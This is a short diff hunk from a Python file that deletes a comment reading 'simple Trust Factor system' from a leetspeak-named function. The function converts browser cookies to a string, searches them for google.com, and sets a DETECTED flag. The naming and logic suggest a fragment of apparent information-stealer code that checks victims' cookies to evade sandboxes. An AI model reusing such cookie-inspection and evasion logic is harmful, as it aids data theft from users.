@@ -201,7 +201,6 @@ def g108411NF0():
 
 
 def TrU57(C00K13s):
-    # simple Trust Factor system
     global DETECTED
     data = str(C00K13s)
     tim = re.findall(".google.com", data)
